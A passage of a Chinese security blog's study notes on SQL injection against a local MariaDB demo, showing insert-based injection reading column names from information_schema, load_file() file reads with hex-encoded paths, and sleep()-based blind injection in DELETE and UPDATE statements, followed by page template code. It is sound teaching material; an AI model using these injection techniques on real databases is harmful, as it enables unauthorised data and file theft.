++------+-------+----------+
+|    1 | aaa   | 123456   |
+|    2 | root@ | demo     |
++------+-------+----------+
+#场景二
+insert into admin1 values(2,&#39;demo&#39;,( select concat(1,column_name,1) from information_schema.columns where table_name=&#39;admin&#39; limit 0,1));
+insert into admin1 values(2,&#39;demo&#39;,( select concat(1,column_name,1) from information_schema.columns where table_name=&#39;admin&#39; limit 1,1));
+insert into admin1 values(2,&#39;demo&#39;,( select concat(1,column_name,1) from information_schema.columns where table_name=&#39;admin&#39; limit 2,1));
+insert into admin1 values(2,&#39;demo&#39;,( select concat(1,column_name,1) from information_schema.columns where table_name=&#39;admin&#39; limit 3,1));
+MariaDB [demo]&gt; select * from admin1;
++------+-------+---------------+
+| id   | name  | password      |
++------+-------+---------------+
+|    1 | aaa   | 123456        |
+|    2 | root@ | demo          |
+|    2 | demo  | 1id1          |
+|    2 | demo  | 1name1        |
+|    2 | demo  | 1password1    |
+|    2 | demo  | 1commint_new1 |
++------+-------+---------------+
+#场景三
+insert into admin1 values(2,&#39;demo&#39;,( select concat(load_file(&#39;./index.php&#39;))));
+MariaDB [demo]&gt; insert into admin1 values(2,&#39;demo&#39;,( select concat(load_file(&#39;./index.php&#39;))));
+Query OK, 1 row affected (0.001 sec)
+
+MariaDB [demo]&gt; select * from admin1;
++------+------+--------------------+
+| id   | name | password           |
++------+------+--------------------+
+|    1 | aaa  | 123456             |
+|    2 | demo | &lt;?php phpinfo()?&gt;
+ |
++------+------+--------------------+
+【&lt;?php phpinfo()?&gt;】等于 0x2e2f696e6465782e706870
+
+MariaDB [demo]&gt; insert into admin1 values(2,&#39;demo&#39;,( select concat(load_file(0x2e2f696e6465782e706870))));
+Query OK, 1 row affected (0.004 sec)
+
+MariaDB [demo]&gt; select * from admin1;
++------+------+--------------------+
+| id   | name | password           |
++------+------+--------------------+
+|    1 | aaa  | 123456             |
+|    2 | demo | &lt;?php phpinfo()?&gt;
+ |
++------+------+--------------------+</code></pre><h2 id="删除型注入"><a href="#删除型注入" class="headerlink" title="删除型注入"></a><center>删除型注入</center></h2><ul>
+<li>delete语句特征，只能以and 布尔型值作为注入</li>
+</ul>
+<pre><code>MariaDB [demo]&gt; delete from admin1 where id=2 and sleep(if((select database() = &#39;demo&#39;),5,0));
+Query OK, 0 rows affected (5.002 sec)
+
+注意，只有当数据库中有id=2这条记录，sleep才能工作。否则如下。sleep函数不工作
+MariaDB [demo]&gt; delete from admin1 where id=3 and sleep( if((select database()=&#39;demo&#39;),5,0));
+Query OK, 0 rows affected (0.001 sec)</code></pre><h2 id="修改型注入"><a href="#修改型注入" class="headerlink" title="修改型注入"></a><center>修改型注入</center></h2><ul>
+<li>update语句特征，可以从修改值的方式注入，或条件的方式注入</li>
+</ul>
+<pre><code>例如：
+POST Head：http://127.0.0.1/aaa/update.php?act=update&amp;id=17
+POST data：name=a&amp;text=b
+
+封装的SQL语句为: update admin1 set name=&#39;a&#39; ,text=&#39;b&#39; where id=17
+
+此时用延时注入，判断注入点：
+MariaDB [demo]&gt; update admin1 set password=&#39;b&#39;;
+Query OK, 0 rows affected (0.001 sec)
+Rows matched: 2  Changed: 0  Warnings: 0
+
+MariaDB [demo]&gt; update admin1 set password=&#39;b&#39; where sleep(5);
+Query OK, 0 rows affected (10.001 sec)
+Rows matched: 0  Changed: 0  Warnings: 0</code></pre>
+            </div>
+            <hr />
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">写作不易，感谢支持!</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        <p class="reprint-tip">
+            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
+            <span>转载规则</span>
+        </p>
+        
+            <div class="center-align">
+                <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                    <img alt=""
+                         style="border-width:0"
+                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
+                </a>
+            </div>
+            <br/>
+            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
+                  property="dct:title" rel="dct:type">
+                    《SQL注入-学习笔记(一)》
+                </span> 由
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/02/11/sql-zhu-ru-xue-xi-bi-ji-yi/" property="cc:attributionName"
+               rel="cc:attributionURL">
+                Royee
+            </a> 采用
+            <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                知识共享署名 4.0 国际许可协议
+            </a>进行许可。
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+        </div>
+    </div>
+
+    
+    <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'd60914fa8a632963a275',
+        clientSecret: '2ccf9f882eb5cc50d929ab4ba568d687e5f20744',
+        repo: 'royeew.github.io',
+        owner: 'RoyeeW',
+        admin: "Royee",
+        id: '2020/02/11/sql-zhu-ru-xue-xi-bi-ji-yi/',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+    <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments input[type=text],
+    #vcomments input[type=email],
+    #vcomments input[type=url],
+    #vcomments textarea {
+        box-sizing: border-box;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #42b983;
+        font-weight: 500;
+        text-decoration: underline;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div id="vcomments" class="card-content"></div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<!-- <script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script> -->
+
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'si5kJvts7udttOmJ96h6cEOQ-gzGzoHsz',
+        appKey: '5rlvl2alBlCQJo0IiXpufh1x',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'false' === 'true',
+        avatar: 'wavatar',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: '欢迎任何善意的评论,\n不喜请您关闭,以免心烦!\n真诚感谢!'
+    });
+</script>
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/02/12/git-pei-zhi-dai-li/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="Git-配置代理">
+                        
+                        <span class="card-title">Git-配置代理</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Git-配置代理
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-12
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Git/" class="post-category" target="_blank">
+                                    Git
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Git/" target="_blank">
+                        <span class="chip bg-color">Git</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/02/05/infogathering-xin-sou/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="InfoGathering-信搜">
+                        
+                        <span class="card-title">InfoGathering-信搜</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            InfoGathering-信搜
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-05
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/PenTest/" class="post-category" target="_blank">
+                                    PenTest
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/InfoGathering/" target="_blank">
+                        <span class="chip bg-color">InfoGathering</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Royee的安全屋<br />'
+            + '作者: Royee<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () { bodyElement.removeChild(newdiv); }, 200);
+    });
+</script>
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+    
+
+</main>
+
+
+<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+    MathJax.Hub.Config({
+        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
+    });
+</script>
+
+    <footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            &copy; Royee All Rights Reserved.
+			
+			
+            &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站内总字数:&nbsp;
+            <span class="white-color">19.2k</span>
+            
+
+            <br>
+            <span id="sitetime"></span>
+
+            
+            
+            <br>
+            
+            <span id="busuanzi_container_site_pv" style='display:none'>
+                <i class="fa fa-heart-o"></i>
+                总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv" style='display:none'>
+                人次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+            </span>
+            
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/github" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:a@b" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://zhihu.com/people/zhihu" class="tooltipped" target="_blank" data-tooltip="访问我的知乎" data-position="top" data-delay="50">
+        <i class="fa fa-inverse">知</i>
+    </a>
+
+
+
+    <a href="https://user.qzone.qq.com/123456789" class="tooltipped" target="_blank" data-tooltip="访问我的QQ空间" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+    <a href="https://weibo.com/weibo" class="tooltipped" target="_blank" data-tooltip="关注我的微博" data-position="top" data-delay="50">
+        <i class="fa fa-weibo"></i>
+    </a>
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+    $(document).ready(function () {
+
+        var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+        var pvcountOffset = 0040;			  // 初始化首次数据
+        var uvcountOffset = 0020;
+
+        function fixCount() {
+            if (document.getElementById("busuanzi_container_site_pv").style.display != "none") {
+                $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + pvcountOffset);
+                $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) );
+                clearInterval(int);
+            }
+            if ($("#busuanzi_container_site_pv").css("display") != "none") {
+                $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + uvcountOffset); // 加上初始数据 
+                clearInterval(int);
+            }
+        }
+    });
+</script>
+
+<script language=javascript>
+    function siteTime() {
+        window.setTimeout("siteTime()", 1000);
+        var seconds = 1000;
+        var minutes = seconds * 60;
+        var hours = minutes * 60;
+        var days = hours * 24;
+        var years = days * 365;
+        var today = new Date();
+        var todayYear = today.getFullYear();
+        var todayMonth = today.getMonth() + 1;
+        var todayDate = today.getDate();
+        var todayHour = today.getHours();
+        var todayMinute = today.getMinutes();
+        var todaySecond = today.getSeconds();
+        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+        year - 作为date对象的年份，为4位年份值
+        month - 0-11之间的整数，做为date对象的月份
+        day - 1-31之间的整数，做为date对象的天数
+        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+        minutes - 0-59之间的整数，做为date对象的分钟数
+        seconds - 0-59之间的整数，做为date对象的秒数
+        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+        var t1 = Date.UTC(2019, 01, 21, 00, 00, 00); // 站点初始如期 北京时间2019-01-21 00:00:00
+        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+        var diff = t2 - t1;
+        var diffYears = Math.floor(diff / years);
+        var diffDays = Math.floor((diff / days) - diffYears * 365);
+        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
+        document.getElementById("sitetime").innerHTML = "\<i class\=\"fa fa-heart-o\"\>\<\/i\>"+"  本站已运行 " + diffYears + " 年 " + diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+    }/*定义站点建站时长*/
+    siteTime();
+</script>
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <script type="text/javascript"> var OriginTitile = document.title, st; document.addEventListener("visibilitychange", function () { document.hidden ? (document.title = "喔哟，崩溃啦！", clearTimeout(st)) : (document.title = "咦，又好了！", st = setTimeout(function () { document.title = OriginTitile }, 3e3)) })
+    </script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+    
+    <script src="/libs/others/clicklove.js"></script>
+    
+
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+</body>
+
+</html>
